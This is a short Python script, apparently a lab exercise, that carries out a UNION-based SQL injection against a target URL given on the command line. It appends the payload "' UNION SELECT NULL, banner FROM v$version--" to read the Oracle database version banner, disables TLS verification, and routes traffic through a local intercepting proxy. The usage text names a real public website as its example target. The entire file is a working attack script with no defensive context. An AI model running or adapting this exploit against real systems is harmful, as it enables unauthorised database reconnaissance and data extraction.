import sys
import urllib3
import requests
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

# CORE	11.2.0.2.0	Production

def exploit(url):
    payload = "' UNION SELECT NULL, banner FROM v$version--"
    r = requests.get(url + payload, verify=False, proxies=proxies)
    if "Oracle Database" in r.text:
        soup = BeautifulSoup(r.text, 'html.parser')
        try:
            banner = soup.body.find(text=re.compile(".*Oracle\sDatabase.*"))
        except:
            return False
        return banner
    return False


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[.] Usage: %s <url>' % sys.argv[0])
        print('[.] Example: %s www.python.org ' % sys.argv[0])
        sys.exit(1)
    print(url)
    print('[.] Dumping version of database')
    response = exploit(url)
    if response:
        print('[.] Banner received %s' % response)
        print('[.] Successful SQLi')
    else:
        print('[*] Unsuccessful SQLi')
